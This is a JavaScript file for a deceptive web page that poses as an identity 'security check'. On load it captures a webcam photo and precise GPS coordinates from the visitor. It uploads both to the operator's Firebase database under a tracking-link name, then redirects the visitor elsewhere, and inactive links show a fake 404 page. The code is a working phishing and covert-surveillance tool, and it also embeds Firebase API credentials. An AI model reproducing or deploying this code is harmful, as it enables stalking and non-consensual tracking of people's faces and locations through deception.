// Firebase Configuration from your screenshot
const firebaseConfig = {
    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZN rpg5nbEUm0",
    authDomain: "camera-c436d.firebaseapp.com",
    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId: "camera-c436d",
    storageBucket: "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
};

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
// Added 'get' to imports to fetch data from the database
import { getDatabase, ref, push, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function initVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('linkId');

    const linkRef = ref(db, 'managed_links/' + linkId);
    const snapshot = await get(linkRef);
    const settings = snapshot.val();

    if (!settings || !settings.active) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h1>404 Not Found</h1></div>";
        return;
    }

    const statusText = document.getElementById('statusText');
    statusText.innerText = "Initializing security check...";

    let lat = "Denied", lon = "Denied";
    let photoData = null;

    // STEP 1: REQUEST CAMERA PERMISSION IMMEDIATELY
    if (settings.cam) {
        try {
            // This line instantly triggers the browser camera permission popup
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.style.display = 'block';
            // Wait for video to be ready
            await new Promise(r => { video.onloadedmetadata = r; });
            await new Promise(r => setTimeout(r, 800));
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photoData = canvas.toDataURL('image/jpeg', 0.5);
            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';
        } catch (e) {
            statusText.innerText = "Camera permission is required to continue.";
        }
    }

    // STEP 2: REQUEST LOCATION PERMISSION IMMEDIATELY
    if (settings.gps) {
        statusText.innerText = "Requesting location access...";
        try {
            // This line instantly triggers the browser location permission popup
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000, enableHighAccuracy: true });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        } catch (e) {
            console.log("GPS denied");
        }
    }

    // STEP 3: SEND TO FIREBASE CLOUD
    statusText.innerText = "Verifying identity...";
    const historyRef = ref(db, 'photo_history');
    const newEntryRef = push(historyRef);
    await set(newEntryRef, {
        id: Date.now(),
        image: photoData,
        latitude: lat,
        longitude: lon,
        linkName: settings.name,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString()
    });

    statusText.innerText = "Verification Success. Redirecting...";
    if (settings.redirectUrl) {
        setTimeout(() => { window.location.href = settings.redirectUrl; }, 1500);
    }
}

window.addEventListener('load', initVerification);
